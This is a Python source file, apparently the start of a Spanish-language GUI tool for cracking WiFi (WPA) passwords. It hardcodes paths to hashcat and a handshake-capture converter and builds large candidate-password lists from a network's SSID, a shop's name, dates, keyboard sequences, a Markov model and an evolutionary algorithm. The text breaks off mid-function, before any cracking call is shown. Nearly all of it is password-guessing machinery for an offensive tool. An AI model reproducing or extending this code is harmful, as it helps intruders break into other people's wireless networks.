import subprocess
import re
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import time
import os
import concurrent.futures
import tempfile
import multiprocessing
import itertools
import string
import random
import queue
import hashlib
import mmap
import numpy as np
from collections import deque, Counter
import ctypes
from multiprocessing import shared_memory, Value, Array
import psutil
import requests
import json
from pathlib import Path

ESTILO = {
    "bg": "#0f0f0f",
    "fg": "#00ff00",
    "font": ("Courier New", 10)
}

HASHCAT_PATH = r"C:\hashcat\hashcat-6.2.6\hashcat-6.2.6\hashcat.exe"
CAP2HCCAPX_PATH = r"C:\hashcatutils\hashcat-utils-1.9\bin\cap2hccapx.exe"

class AnalizadorContextual:
    def __init__(self):
        self.datos_personales = []
        self.datos_corporativos = []
        self.patrones_regionales = {
            'es': ['contraseña', 'clave', 'admin', 'usuario'],
            'en': ['password', 'admin', 'user', 'login'],
            'fr': ['motdepasse', 'admin', 'utilisateur'],
            'de': ['passwort', 'admin', 'benutzer']
        }
        self.fechas_comunes = self.generar_fechas_comunes()
    def generar_fechas_comunes(self):
        fechas = []
        for año in range(1980, 2025):
            fechas.extend([str(año), str(año)[2:]])
        for mes in range(1, 13):
            fechas.extend([f"{mes:02d}", str(mes)])
        for dia in range(1, 32):
            fechas.extend([f"{dia:02d}", str(dia)])
        return fechas
    def analizar_ssid_contexto(self, ssid):
        contexto = []
        if ssid:
            ssid_limpio = re.sub(r'[^a-zA-Z0-9]', '', ssid)
            contexto.append(ssid_limpio)
            contexto.append(ssid_limpio.lower())
            contexto.append(ssid_limpio.upper())
            numeros = re.findall(r'\d+', ssid)
            letras = re.findall(r'[a-zA-Z]+', ssid)
            contexto.extend(numeros)
            contexto.extend(letras)
        return contexto

class GeneradorComercioRuido:
    def __init__(self):
        self.chars_letras = string.ascii_letters
        self.chars_digitos = string.digits
        self.chars_simbolos = '!@#$%&*+-=_'
        self.chars_todos = self.chars_letras + self.chars_digitos + self.chars_simbolos
        self.sufijos_empresariales = ['123', '2024', '2023', '01', '1', '12', '00', '99', '321', '456', '2022', '24', '23', '22']
        self.prefijos_empresariales = ['123', '2024', '2023', '1', '12', '00', '2022', '24', '23', '22']
        
    def generar_ruido_comercio_optimizado(self, nombre_comercio, longitud_objetivo, max_candidatos=150000):
        if not nombre_comercio:
            return []
        
        nombre_clean = re.sub(r'[^a-zA-Z0-9]', '', nombre_comercio)
        candidatos = set()
        
        variaciones_nombre = [
            nombre_clean,
            nombre_clean.lower(),
            nombre_clean.upper(),
            nombre_clean.capitalize(),
            nombre_clean.title()
        ]
        
        if len(nombre_clean) > 4:
            variaciones_nombre.extend([
                nombre_clean[:4],
                nombre_clean[:5],
                nombre_clean[:6],
                nombre_clean[-4:],
                nombre_clean[-5:],
                nombre_clean[-6:]
            ])
        
        for nombre_var in variaciones_nombre:
            if not nombre_var or len(candidatos) >= max_candidatos:
                break
                
            len_nombre = len(nombre_var)
            if len_nombre >= longitud_objetivo:
                continue
                
            espacio_ruido = longitud_objetivo - len_nombre
            
            for ruido_pre in range(1, min(espacio_ruido, 5)):
                ruido_suf = espacio_ruido - ruido_pre
                if ruido_suf < 1 or ruido_suf > 4:
                    continue
                    
                chars_pre_opciones = [
                    self.chars_letras.lower(),
                    self.chars_letras.upper(),
                    self.chars_digitos,
                    self.chars_letras.lower() + self.chars_digitos,
                    self.chars_letras.upper() + self.chars_digitos,
                    self.chars_todos
                ]
                
                chars_suf_opciones = [
                    self.chars_digitos,
                    self.chars_letras.lower(),
                    self.chars_simbolos,
                    self.chars_digitos + self.chars_simbolos,
                    self.chars_letras + self.chars_digitos,
                    self.chars_todos
                ]
                
                for chars_pre in chars_pre_opciones:
                    if len(candidatos) >= max_candidatos:
                        break
                    for chars_suf in chars_suf_opciones:
                        if len(candidatos) >= max_candidatos:
                            break
                            
                        intentos_por_combinacion = min(50, max_candidatos // 100)
                        for _ in range(intentos_por_combinacion):
                            prefijo = ''.join(random.choices(chars_pre, k=ruido_pre))
                            sufijo = ''.join(random.choices(chars_suf, k=ruido_suf))
                            candidato = prefijo + nombre_var + sufijo
                            
                            if len(candidato) == longitud_objetivo:
                                candidatos.add(candidato)
                                
                            if len(candidatos) >= max_candidatos:
                                break
        
        for nombre_var in variaciones_nombre:
            if len(candidatos) >= max_candidatos:
                break
                
            for sufijo in self.sufijos_empresariales:
                if len(candidatos) >= max_candidatos:
                    break
                combinacion = nombre_var + sufijo
                if len(combinacion) <= longitud_objetivo:
                    candidatos.add(combinacion)
                    
                    resto = longitud_objetivo - len(combinacion)
                    if resto > 0:
                        for _ in range(10):
                            relleno = ''.join(random.choices(self.chars_todos, k=resto))
                            candidatos.add(combinacion + relleno)
                            candidatos.add(relleno + combinacion)
                            
            for prefijo in self.prefijos_empresariales:
                if len(candidatos) >= max_candidatos:
                    break
                combinacion = prefijo + nombre_var
                if len(combinacion) <= longitud_objetivo:
                    candidatos.add(combinacion)
                    
                    resto = longitud_objetivo - len(combinacion)
                    if resto > 0:
                        for _ in range(10):
                            relleno = ''.join(random.choices(self.chars_todos, k=resto))
                            candidatos.add(combinacion + relleno)
                            candidatos.add(relleno + combinacion)
        
        return list(candidatos)[:max_candidatos]
    
class GeneradorPatronesInvalidos:
    def __init__(self):
        self.letras_min = string.ascii_lowercase
        self.letras_may = string.ascii_uppercase
        self.numeros = string.digits
        self.simbolos = "!@#$%&*()+-=[]{}|\\:;\"'<>,.?/~`^_"
        
        self.secuencias_comunes = [
            "abc", "bcd", "cde", "def", "efg", "fgh", "ghi", "hij", "ijk", "jkl", "klm", "lmn", 
            "mno", "nop", "opq", "pqr", "qrs", "rst", "stu", "tuv", "uvw", "vwx", "wxy", "xyz",
            "123", "234", "345", "456", "567", "678", "789", "890", "012",
            "qwe", "wer", "ert", "rty", "tyu", "yui", "uio", "iop", "asd", "sdf", "dfg", "fgh",
            "ghj", "hjk", "jkl", "zxc", "xcv", "cvb", "vbn", "bnm", "qwerty", "asdfg", "zxcvb"
        ]
        
        self.repeticiones_tipicas = ["aa", "bb", "cc", "dd", "ee", "ff", "gg", "hh", "ii", "jj", 
                                   "kk", "ll", "mm", "nn", "oo", "pp", "qq", "rr", "ss", "tt", 
                                   "uu", "vv", "ww", "xx", "yy", "zz", "00", "11", "22", "33", 
                                   "44", "55", "66", "77", "88", "99", "!!", "@@", "##", "$$"]

class GeneradorRepeticionesConsecutivas:
    def __init__(self):
        self.base = GeneradorPatronesInvalidos()
    
    def generar_con_repeticiones(self, longitud):
        candidato = []
        for i in range(longitud):
            if i > 0 and random.random() < 0.4:
                candidato.append(candidato[-1])
            else:
                tipo = random.choice(['letra_min', 'letra_may', 'numero', 'simbolo'])
                if tipo == 'letra_min':
                    candidato.append(random.choice(self.base.letras_min))
                elif tipo == 'letra_may':
                    candidato.append(random.choice(self.base.letras_may))
                elif tipo == 'numero':
                    candidato.append(random.choice(self.base.numeros))
                else:
                    candidato.append(random.choice(self.base.simbolos))
        return ''.join(candidato)
    
    def generar_dobles_especificas(self, longitud):
        candidato = []
        while len(candidato) < longitud:
            if random.random() < 0.5:
                doble = random.choice(self.base.repeticiones_tipicas)
                candidato.extend(list(doble))
            else:
                tipo = random.choice(['letra_min', 'letra_may', 'numero', 'simbolo'])
                if tipo == 'letra_min':
                    candidato.append(random.choice(self.base.letras_min))
                elif tipo == 'letra_may':
                    candidato.append(random.choice(self.base.letras_may))
                elif tipo == 'numero':
                    candidato.append(random.choice(self.base.numeros))
                else:
                    candidato.append(random.choice(self.base.simbolos))
        return ''.join(candidato[:longitud])

class GeneradorSecuenciasObvias:
    def __init__(self):
        self.base = GeneradorPatronesInvalidos()
    
    def generar_con_secuencias(self, longitud):
        candidato = []
        secuencia = random.choice(self.base.secuencias_comunes)
        candidato.extend(list(secuencia))
        
        while len(candidato) < longitud:
            tipo = random.choice(['letra_min', 'letra_may', 'numero', 'simbolo'])
            if tipo == 'letra_min':
                candidato.append(random.choice(self.base.letras_min))
            elif tipo == 'letra_may':
                candidato.append(random.choice(self.base.letras_may))
            elif tipo == 'numero':
                candidato.append(random.choice(self.base.numeros))
            else:
                candidato.append(random.choice(self.base.simbolos))
        
        random.shuffle(candidato)
        return ''.join(candidato[:longitud])

class GeneradorTiposAgrupados:
    def __init__(self):
        self.base = GeneradorPatronesInvalidos()
    
    def generar_letras_agrupadas(self, longitud):
        candidato = []
        num_letras = max(4, longitud // 2)
        num_numeros = max(2, longitud // 4)
        num_simbolos = longitud - num_letras - num_numeros
        
        for _ in range(num_letras):
            if random.random() < 0.5:
                candidato.append(random.choice(self.base.letras_min))
            else:
                candidato.append(random.choice(self.base.letras_may))
        
        for _ in range(num_numeros):
            candidato.append(random.choice(self.base.numeros))
        
        for _ in range(num_simbolos):
            candidato.append(random.choice(self.base.simbolos))
        
        return ''.join(candidato[:longitud])

class GeneradorDistribucionPobre:
    def __init__(self):
        self.base = GeneradorPatronesInvalidos()
    
    def generar_solo_letras(self, longitud):
        candidato = []
        for _ in range(longitud):
            if random.random() < 0.7:
                candidato.append(random.choice(self.base.letras_min))
            else:
                candidato.append(random.choice(self.base.letras_may))
        return ''.join(candidato)
    
    def generar_dos_tipos_solo(self, longitud):
        tipos = random.sample(['letras', 'numeros', 'simbolos'], 2)
        candidato = []
        
        for _ in range(longitud):
            tipo_elegido = random.choice(tipos)
            if tipo_elegido == 'letras':
                if random.random() < 0.5:
                    candidato.append(random.choice(self.base.letras_min))
                else:
                    candidato.append(random.choice(self.base.letras_may))
            elif tipo_elegido == 'numeros':
                candidato.append(random.choice(self.base.numeros))
            else:
                candidato.append(random.choice(self.base.simbolos))
        
        return ''.join(candidato)

class GeneradorPatternsAntitesis:
    def __init__(self):
        self.gen_repeticiones = GeneradorRepeticionesConsecutivas()
        self.gen_secuencias = GeneradorSecuenciasObvias()
        self.gen_agrupados = GeneradorTiposAgrupados()
        self.gen_distribucion = GeneradorDistribucionPobre()
    
    def generar_candidato_antitesis(self, longitud, metodo='random'):
        if metodo == 'repeticiones_consecutivas':
            if random.random() < 0.5:
                return self.gen_repeticiones.generar_con_repeticiones(longitud)
            else:
                return self.gen_repeticiones.generar_dobles_especificas(longitud)
        elif metodo == 'secuencias_obvias':
            return self.gen_secuencias.generar_con_secuencias(longitud)
        elif metodo == 'tipos_agrupados':
            return self.gen_agrupados.generar_letras_agrupadas(longitud)
        elif metodo == 'distribucion_pobre':
            if random.random() < 0.5:
                return self.gen_distribucion.generar_solo_letras(longitud)
            else:
                return self.gen_distribucion.generar_dos_tipos_solo(longitud)
        else:
            metodos = ['repeticiones_consecutivas', 'secuencias_obvias', 'tipos_agrupados', 'distribucion_pobre']
            metodo_elegido = random.choice(metodos)
            return self.generar_candidato_antitesis(longitud, metodo_elegido)
    
    def generar_lote_antitesis(self, longitud, cantidad):
        candidatos = []
        metodos = ['repeticiones_consecutivas', 'secuencias_obvias', 'tipos_agrupados', 'distribucion_pobre']
        cantidad_por_metodo = cantidad // len(metodos)
        
        for metodo in metodos:
            for _ in range(cantidad_por_metodo):
                candidato = self.generar_candidato_antitesis(longitud, metodo)
                candidatos.append(candidato)
        
        cantidad_restante = cantidad - len(candidatos)
        for _ in range(cantidad_restante):
            metodo = random.choice(metodos)
            candidato = self.generar_candidato_antitesis(longitud, metodo)
            candidatos.append(candidato)
        
        return candidatos    
    
class AnalizadorFrecuenciaAvanzado:
    def __init__(self):
        self.frecuencias_geograficas = {
            'global': 'etaoinshrdlcumwfgypbvkjxqz',
            'es': 'eaosrnidltcumpbgvyqhfzjxkw',
            'en': 'etaoinshrdlcumwfgypbvkjxqz',
            'nums_comunes': '0123456789',
            'nums_patrones': '1023456789',
            'simbolos_frecuentes': '!@#$%&*+-=_',
            'simbolos_raros': '~^?<>[]{}|\\().,;:',
            'posiciones_nums_inicio': [0, 1, -1, -2],
            'posiciones_nums_medio': [3, 4, 5, 6, 7, 8],
            'posiciones_nums_final': [-1, -2, -3],
            'posiciones_simbolos_inicio': [0, 1, 2],
            'posiciones_simbolos_medio': [3, 4, 5, 6, 7, 8],
            'posiciones_simbolos_final': [-1, -2, -3]
        }
        self.patrones_biometricos = {
            'teclado_qwerty': self.generar_patrones_qwerty(),
            'teclado_azerty': self.generar_patrones_azerty(),
            'movimientos_mano': self.generar_movimientos_mano()
        }
    def generar_patrones_qwerty(self):
        return {
            'fila_superior': 'qwertyuiop',
            'fila_media': 'asdfghjkl',
            'fila_inferior': 'zxcvbnm',
            'columna_izq': 'qaz',
            'columna_der': 'plm'
        }
    def generar_patrones_azerty(self):
        return {
            'fila_superior': 'azertyuiop',
            'fila_media': 'qsdfghjklm',
            'fila_inferior': 'wxcvbn'
        }
    def generar_movimientos_mano(self):
        return {
            'zigzag': ['qweasd', 'asdzxc', 'zxcvbn'],
            'circular': ['qwe', 'asd', 'zxc'],
            'diagonal': ['qay', 'wsx', 'edc']
        }
    def generar_con_frecuencia_geografica(self, longitud, region='global'):
        candidato = [''] * longitud
        letras_region = self.frecuencias_geograficas.get(region, self.frecuencias_geograficas['global'])
        num_simbolos = max(1, longitud // 4)
        num_numeros = max(1, longitud // 4)
        posiciones_simbolos = random.sample(
            self.frecuencias_geograficas['posiciones_simbolos_inicio'] +
            self.frecuencias_geograficas['posiciones_simbolos_medio'] +
            self.frecuencias_geograficas['posiciones_simbolos_final'],
            min(num_simbolos, len(self.frecuencias_geograficas['posiciones_simbolos_inicio']) + 
                len(self.frecuencias_geograficas['posiciones_simbolos_medio']) +
                len(self.frecuencias_geograficas['posiciones_simbolos_final']))
        )
        for pos in posiciones_simbolos:
            if pos < 0:
                pos = longitud + pos
            if 0 <= pos < longitud:
                candidato[pos] = random.choice(self.frecuencias_geograficas['simbolos_frecuentes'])
        posiciones_numeros = random.sample(
            self.frecuencias_geograficas['posiciones_nums_inicio'] +
            self.frecuencias_geograficas['posiciones_nums_medio'] +
            self.frecuencias_geograficas['posiciones_nums_final'],
            min(num_numeros, len(self.frecuencias_geograficas['posiciones_nums_inicio']) +
                len(self.frecuencias_geograficas['posiciones_nums_medio']) +
                len(self.frecuencias_geograficas['posiciones_nums_final']))
        )
        for pos in posiciones_numeros:
            if pos < 0:
                pos = longitud + pos
            if 0 <= pos < longitud and candidato[pos] == '':
                candidato[pos] = random.choice(self.frecuencias_geograficas['nums_patrones'][:8])
        for i in range(longitud):
            if candidato[i] == '':
                if random.random() < 0.65:
                    candidato[i] = random.choice(letras_region[:15])
                else:
                    candidato[i] = random.choice(letras_region[:12]).upper()
        return ''.join(candidato)

class PatronesEspecificosAvanzados:
    def __init__(self):
        self.patrones_estructurales = [
            'LNLSLNLSLNLS',
            'LLNSLSLNLSNN',
            'SLNLNLNLNLNS',
            'LNLNSLSLNLSL',
            'LLSLNLNLSLNN',
            'SNLNLSLNLSLN',
            'LSLNLNSLNLSN',
            'NLSLNLSLNLSL',
            'LLLSNNNLLLSS',
            'SSSNNLLLLSNN',
            'LNSSSSLNSLNS',
            'NNNLLSSSLNLN'
        ]
        self.patrones_empresariales = [
            'EmpresaAño!',
            'NombreNúmeroSím',
            'AñoLetrasSím',
            'InicialFechaSím'
        ]
        self.patrones_personales = [
            'NombreFechaSím',
            'ApellidoAñoSím',
            'InicialDíaSím',
            'NombreCompletoDía'
        ]
    def generar_patron_empresarial(self, patron, contexto=None):
        resultado = []
        for char_type in patron:
            if char_type == 'L':
                if random.random() < 0.6:
                    resultado.append(random.choice('etaoinshrdlcumw'))
                else:
                    resultado.append(random.choice('ETAOINSHRDLC'))
            elif char_type == 'N':
                if contexto and random.random() < 0.3:
                    resultado.append(random.choice(['2', '0', '1', '9']))
                else:
                    resultado.append(random.choice('0123456789'))
            elif char_type == 'S':
                peso_simbolos = {
                    '!': 0.25, '@': 0.20, '#': 0.15, '$': 0.10,
                    '%': 0.08, '&': 0.07, '*': 0.05, '+': 0.05,
                    '-': 0.03, '=': 0.02
                }
                simbolos = list(peso_simbolos.keys())
                pesos = list(peso_simbolos.values())
                resultado.append(random.choices(simbolos, weights=pesos)[0])
        return ''.join(resultado)

class AlgoritmoEvolutivo:
    def __init__(self, tamaño_poblacion=1000):
        self.tamaño_poblacion = tamaño_poblacion
        self.poblacion = []
        self.generacion = 0
        self.mejor_fitness = 0
        self.historial_fitness = []
    def inicializar_poblacion(self, longitud):
        generador = GeneradorPatternsHiperAvanzado()
        self.poblacion = []
        for _ in range(self.tamaño_poblacion):
            metodo = random.choice(['frecuencia', 'patrones', 'markov', 'contextual'])
            individuo = generador.generar_candidato_hiper(longitud, metodo)
            self.poblacion.append(individuo)
    def evaluar_fitness(self, individuo):
        fitness = 0
        tiene_mayuscula = any(c.isupper() for c in individuo)
        tiene_minuscula = any(c.islower() for c in individuo)
        tiene_numero = any(c.isdigit() for c in individuo)
        tiene_simbolo = any(not c.isalnum() for c in individuo)
        fitness += sum([tiene_mayuscula, tiene_minuscula, tiene_numero, tiene_simbolo]) * 25
        for i in range(len(individuo) - 1):
            if individuo[i] != individuo[i + 1]:
                fitness += 10
        secuencias_malas = ['123', 'abc', 'qwe', 'asd', '000', 'AAA']
        for seq in secuencias_malas:
            if seq.lower() in individuo.lower():
                fitness -= 50
        if len(set(individuo)) > len(individuo) * 0.7:
            fitness += 20
        return max(0, fitness)
    def seleccion_torneo(self, k=3):
        seleccionados = random.sample(self.poblacion, k)
        return max(seleccionados, key=self.evaluar_fitness)
    def cruzar(self, padre1, padre2):
        punto_cruce = random.randint(1, len(padre1) - 1)
        hijo1 = padre1[:punto_cruce] + padre2[punto_cruce:]
        hijo2 = padre2[:punto_cruce] + padre1[punto_cruce:]
        return hijo1, hijo2
    def mutar(self, individuo, tasa_mutacion=0.1):
        if random.random() < tasa_mutacion:
            pos = random.randint(0, len(individuo) - 1)
            nuevo_char = random.choice(string.ascii_letters + string.digits + '!@#$%&*+-=_')
            individuo = individuo[:pos] + nuevo_char + individuo[pos+1:]
        return individuo
    def evolucionar_generacion(self):
        nueva_poblacion = []
        elite_size = self.tamaño_poblacion // 10
        elite = sorted(self.poblacion, key=self.evaluar_fitness, reverse=True)[:elite_size]
        nueva_poblacion.extend(elite)
        while len(nueva_poblacion) < self.tamaño_poblacion:
            padre1 = self.seleccion_torneo()
            padre2 = self.seleccion_torneo()
            if random.random() < 0.8:
                hijo1, hijo2 = self.cruzar(padre1, padre2)
            else:
                hijo1, hijo2 = padre1, padre2
            hijo1 = self.mutar(hijo1)
            hijo2 = self.mutar(hijo2)
            nueva_poblacion.extend([hijo1, hijo2])
        self.poblacion = nueva_poblacion[:self.tamaño_poblacion]
        self.generacion += 1
        fitness_actual = max(self.evaluar_fitness(ind) for ind in self.poblacion)
        self.historial_fitness.append(fitness_actual)
        if fitness_actual > self.mejor_fitness:
            self.mejor_fitness = fitness_actual
    def obtener_mejores_candidatos(self, n=1000):
        candidatos_fitness = [(ind, self.evaluar_fitness(ind)) for ind in self.poblacion]
        candidatos_fitness.sort(key=lambda x: x[1], reverse=True)
        return [candidato for candidato, fitness in candidatos_fitness[:n]]

class ModeloMarkovAvanzado:
    def __init__(self):
        self.transiciones_basicas = {
            'letra_min': {'letra_may': 0.25, 'numero': 0.45, 'simbolo': 0.30},
            'letra_may': {'letra_min': 0.55, 'numero': 0.25, 'simbolo': 0.20},
            'numero': {'letra_min': 0.40, 'letra_may': 0.35, 'simbolo': 0.25},
            'simbolo': {'letra_min': 0.45, 'letra_may': 0.35, 'numero': 0.20}
        }
        self.transiciones_contextuales = {
            'empresarial': {
                'letra_min': {'letra_may': 0.15, 'numero': 0.55, 'simbolo': 0.30},
                'letra_may': {'letra_min': 0.65, 'numero': 0.20, 'simbolo': 0.15},
                'numero': {'letra_min': 0.35, 'letra_may': 0.40, 'simbolo': 0.25},
                'simbolo': {'letra_min': 0.50, 'letra_may': 0.40, 'numero': 0.10}
            },
            'personal': {
                'letra_min': {'letra_may': 0.35, 'numero': 0.35, 'simbolo': 0.30},
                'letra_may': {'letra_min': 0.45, 'numero': 0.35, 'simbolo': 0.20},
                'numero': {'letra_min': 0.45, 'letra_may': 0.30, 'simbolo': 0.25},
                'simbolo': {'letra_min': 0.40, 'letra_may': 0.30, 'numero': 0.30}
            }
        }
        self.memoria_transiciones = {}
        self.orden_markov = 2
    def entrenar_con_datos(self, passwords_entrenamiento):
        for pwd in passwords_entrenamiento:
            for i in range(len(pwd) - self.orden_markov):
                estado = pwd[i:i+self.orden_markov]
                siguiente = pwd[i+self.orden_markov]
                if estado not in self.memoria_transiciones:
                    self.memoria_transiciones[estado] = Counter()
                self.memoria_transiciones[estado][siguiente] += 1
    def siguiente_char_memoria(self, estado):
        if estado in self.memoria_transiciones:
            candidatos = list(self.memoria_transiciones[estado].keys())
            pesos = list(self.memoria_transiciones[estado].values())
            return random.choices(candidatos, weights=pesos)[0]
        return None
    def generar_markov_contextual(self, longitud, contexto='basico'):
        if contexto in self.transiciones_contextuales:
            transiciones = self.transiciones_contextuales[contexto]
        else:
            transiciones = self.transiciones_basicas
        tipos = ['letra_min', 'letra_may', 'numero', 'simbolo']
        tipo_actual = random.choice(tipos)
        resultado = []
        for i in range(longitud):
            if len(resultado) >= self.orden_markov:
                estado = ''.join(resultado[-self.orden_markov:])
                char_memoria = self.siguiente_char_memoria(estado)
                if char_memoria and random.random() < 0.3:
                    resultado.append(char_memoria)
                    continue
            if tipo_actual == 'letra_min':
                char = random.choice('etaoinshrdlcumw')
            elif tipo_actual == 'letra_may':
                char = random.choice('ETAOINSHRDLC')
            elif tipo_actual == 'numero':
                char = random.choice('0123456789')
            else:
                char = random.choice('!@#$%&*+-=_')
            resultado.append(char)
            opciones = transiciones[tipo_actual]
            tipos_disponibles = list(opciones.keys())
            pesos = list(opciones.values())
            tipo_actual = random.choices(tipos_disponibles, weights=pesos)[0]
        return ''.join(resultado)

class PredictivoAvanzado:
    def __init__(self):
        self.base_conocimiento = Counter()
        self.patrones_ngrams = {}
        self.longitud_segmentos = 4
        self.entrenar_con_base_masiva()
    def entrenar_con_base_masiva(self):
        passwords_base = [
            'MyP@ssw0rd123', 'Tr0ub4dor&3', 'C0mpl3x!Pass', 'Str0ng#P@ss1',
            'S3cur3*K3y12', 'H@rd2Gu3ss!', 'P@ssword123', 'Welcome1!',
            'Admin123!', 'Test!ng123', 'Secure*Pass', 'Strong&Key1',
            'Company2024!', 'Business#1', 'Office*2024', 'Work123!',
            'Manager@2024', 'Director#1', 'Employee*1', 'Staff2024!',
            'Personal123!', 'Family*2024', 'Home#Password', 'My2024Pass!',
            'Summer2024!', 'Winter*2023', 'Spring#2024', 'Autumn*2024'
        ]
        for pwd in passwords_base:
            for n in range(2, min(6, len(pwd))):
                for i in range(len(pwd) - n + 1):
                    ngram = pwd[i:i+n]
                    tipos = ''.join([self.tipo_char_detallado(c) for c in ngram])
                    if n not in self.patrones_ngrams:
                        self.patrones_ngrams[n] = Counter()
                    self.patrones_ngrams[n][tipos] += 1
            for i in range(len(pwd) - self.longitud_segmentos + 1):
                segmento = pwd[i:i + self.longitud_segmentos]
                tipos = ''.join([self.tipo_char_detallado(c) for c in segmento])
                self.base_conocimiento[tipos] += 1
    def tipo_char_detallado(self, c):
        if c.islower():
            return 'l'
        elif c.isupper():
            return 'L'
        elif c.isdigit():
            return 'n'
        elif c in '!@#$%&*':
            return 's'
        else:
            return 'r'
    def generar_predictivo_avanzado(self, longitud):
        if longitud <= 4:
            patron_elegido = self.seleccionar_patron_base(longitud)
        else:
            patron_elegido = self.construir_patron_largo(longitud)
        return self.patron_a_password_avanzado(patron_elegido)
    def seleccionar_patron_base(self, longitud):
        if longitud in self.patrones_ngrams:
            patrones_comunes = list(self.patrones_ngrams[longitud].most_common(20))
        else:
            patrones_comunes = list(self.base_conocimiento.most_common(20))
        if patrones_comunes:
            patron_elegido = random.choice(patrones_comunes)[0]
            return (patron_elegido * (longitud // len(patron_elegido) + 1))[:longitud]
        else:
            return 'lLnsLnls'[:longitud]
    def construir_patron_largo(self, longitud):
        patron = ''
        while len(patron) < longitud:
            n = min(4, longitud - len(patron))
            if n in self.patrones_ngrams:
                segmento = random.choice(list(self.patrones_ngrams[n].most_common(10)))[0]
            else:
                segmento = 'lLns'
            patron += segmento
        return patron[:longitud]
    def patron_a_password_avanzado(self, patron):
        resultado = []
        for i, tipo in enumerate(patron):
            if tipo == 'l':
                if i == 0:
                    resultado.append(random.choice('etaoinshr'))
                else:
                    resultado.append(random.choice('etaoinshrdlc'))
            elif tipo == 'L':
                if i == 0:
                    resultado.append(random.choice('ETAOINSHR'))
                else:
                    resultado.append(random.choice('ETAOINSHRD'))
            elif tipo == 'n':
                if i in [0, len(patron)-1]:
                    resultado.append(random.choice('123456789'))
                else:
                    resultado.append(random.choice('0123456789'))
            elif tipo == 's':
                resultado.append(random.choice('!@#$%&*'))
            else:
                resultado.append(random.choice('+-=_~^'))
        return ''.join(resultado)

class GeneradorPatternsHiperAvanzado:
    def __init__(self):
        self.letras_min = 'etaoinshrdlcumwfgypbvkjxqz'
        self.letras_may = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
        self.numeros = '0123456789'
        self.simbolos = "!@#$%&*+-=?_~^"
        self.secuencias_prohibidas = [
            "abc", "bcd", "cde", "def", "efg", "fgh", "ghi", "hij", "ijk", 
            "jkl", "klm", "lmn", "mno", "nop", "opq", "pqr", "qrs", "rst", 
            "stu", "tuv", "uvw", "vwx", "wxy", "xyz", "123", "234", "345", 
            "456", "567", "678", "789", "890", "qwe", "wer", "ert", "rty", 
            "tyu", "yui", "uio", "iop", "asd", "sdf", "dfg", "fgh", "ghj", 
            "hjk", "jkl", "zxc", "xcv", "cvb", "vbn", "bnm", "qwerty", 
            "asdfg", "zxcvb", "12345", "54321"
        ]
        self.analizador_freq_avanzado = AnalizadorFrecuenciaAvanzado()
        self.patrones_esp_avanzados = PatronesEspecificosAvanzados()
        self.markov_avanzado = ModeloMarkovAvanzado()
        self.predictivo_avanzado = PredictivoAvanzado()
        self.analizador_contextual = AnalizadorContextual()
        self.algoritmo_evolutivo = AlgoritmoEvolutivo()
    def es_secuencia_hiper_valida(self, secuencia):
        secuencia_lower = secuencia.lower()
        for seq_prohibida in self.secuencias_prohibidas:
            if seq_prohibida in secuencia_lower:
                return False
        if len(set(secuencia)) < len(secuencia) * 0.6:
            return False
        for i in range(len(secuencia) - 1):
            if secuencia[i] == secuencia[i + 1]:
                return False
        tipos_consecutivos = 0
        ultimo_tipo = None
        max_consecutivos = 2 if len(secuencia) <= 8 else 1
        for char in secuencia:
            if char.isalpha():
                tipo_actual = 'letra'
            elif char.isdigit():
                tipo_actual = 'numero'
            else:
                tipo_actual = 'simbolo'
            if tipo_actual == ultimo_tipo:
                tipos_consecutivos += 1
                if tipos_consecutivos >= max_consecutivos:
                    return False
            else:
                tipos_consecutivos = 0
            ultimo_tipo = tipo_actual
        tiene_mayuscula = any(c.isupper() for c in secuencia)
        tiene_minuscula = any(c.islower() for c in secuencia)
        tiene_numero = any(c.isdigit() for c in secuencia)
        tiene_simbolo = any(c in self.simbolos for c in secuencia)
        tipos_count = sum([tiene_mayuscula, tiene_minuscula, tiene_numero, tiene_simbolo])
        if len(secuencia) >= 6 and tipos_count < 3:
            return False
        if len(secuencia) >= 10 and tipos_count < 4:
            return False
        return True
    def generar_candidato_hiper(self, longitud, metodo='random', contexto=None):
        max_intentos = 50
        for _ in range(max_intentos):
            if metodo == 'frecuencia_geografica':
                region = contexto.get('region', 'global') if contexto else 'global'
                candidato = self.analizador_freq_avanzado.generar_con_frecuencia_geografica(longitud, region)
            elif metodo == 'patrones_empresariales':
                patron = random.choice(self.patrones_esp_avanzados.patrones_estructurales)
                patron_ajustado = (patron * (longitud // len(patron) + 1))[:longitud]
                candidato = self.patrones_esp_avanzados.generar_patron_empresarial(patron_ajustado, contexto)
            elif metodo == 'markov_contextual':
                tipo_contexto = contexto.get('tipo', 'basico') if contexto else 'basico'
                candidato = self.markov_avanzado.generar_markov_contextual(longitud, tipo_contexto)
            elif metodo == 'predictivo_avanzado':
                candidato = self.predictivo_avanzado.generar_predictivo_avanzado(longitud)
            elif metodo == 'evolutivo':
                if not self.algoritmo_evolutivo.poblacion:
                    self.algoritmo_evolutivo.inicializar_poblacion(longitud)
                    for _ in range(5):
                        self.algoritmo_evolutivo.evolucionar_generacion()
                candidatos = self.algoritmo_evolutivo.obtener_mejores_candidatos(1)
                candidato = candidatos[0] if candidatos else self.generar_tradicional_mejorado(longitud)
            elif metodo == 'contextual':
                candidato = self.generar_contextual(longitud, contexto)
            else:
                candidato = self.generar_tradicional_mejorado(longitud)
            if self.es_secuencia_hiper_valida(candidato):
                return candidato
        return ''.join(random.choices(self.letras_min + self.letras_may + self.numeros + self.simbolos, k=longitud))
    def generar_contextual(self, longitud, contexto):
        if not contexto:
            return self.generar_tradicional_mejorado(longitud)
        candidato = []
        elementos_contexto = contexto.get('elementos', [])
        if elementos_contexto and random.random() < 0.4:
            elemento_base = random.choice(elementos_contexto)[:4]
            candidato.extend(list(elemento_base))
        while len(candidato) < longitud:
            if random.random() < 0.3 and elementos_contexto:
                char = random.choice(random.choice(elementos_contexto))
            else:
                tipo = random.choice(['letra_min', 'letra_may', 'numero', 'simbolo'])
                if tipo == 'letra_min':
                    char = random.choice(self.letras_min[:12])
                elif tipo == 'letra_may':
                    char = random.choice(self.letras_may[:8])
                elif tipo == 'numero':
                    char = random.choice(self.numeros)
                else:
                    char = random.choice(self.simbolos[:8])
            if not candidato or char != candidato[-1]:
                candidato.append(char)
        return ''.join(candidato[:longitud])
    def generar_tradicional_mejorado(self, longitud):
        candidato = []
        tipos_disponibles = ['letra_min', 'letra_may', 'numero', 'simbolo']
        ultimo_tipo = None
        consecutivos = 0
        for pos in range(longitud):
            tipos_validos = tipos_disponibles.copy()
            if ultimo_tipo and consecutivos >= 1:
